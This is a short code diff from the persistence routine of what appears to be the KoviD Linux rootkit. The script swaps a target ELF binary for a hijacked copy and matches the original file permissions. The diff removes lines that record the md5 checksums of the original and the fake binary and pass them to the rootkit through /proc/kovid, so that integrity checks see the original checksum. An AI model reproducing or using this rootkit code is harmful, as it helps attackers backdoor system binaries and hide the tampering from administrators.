@@ -83,10 +83,6 @@ function do_persist() {
     # Check it target file is and ELF binary
     readelf -h "$target" || false
 
-    # Save original target checksum
-    # This will be used later for KoviD -m
-    chksum_orig="$(md5sum "$target"| cut -d " " -f1)"
-
     # After copying the hijacked binary, update
     # permissions to match the original
     perm="$(stat -c '%a' "$target")"
@@ -137,12 +133,6 @@ function do_persist() {
         false
     }
     chmod "$perm" "$target"
-
-    chksum_fake="$(md5sum "$vf"| cut -d " " -f1)"
-
-    # Add new checksum
-    echo "-m $chksum_orig $chksum_fake" >/proc/kovid
-    echo "Success $chksum_fake $chksum_orig"
 
     rm -f "$vf"
 
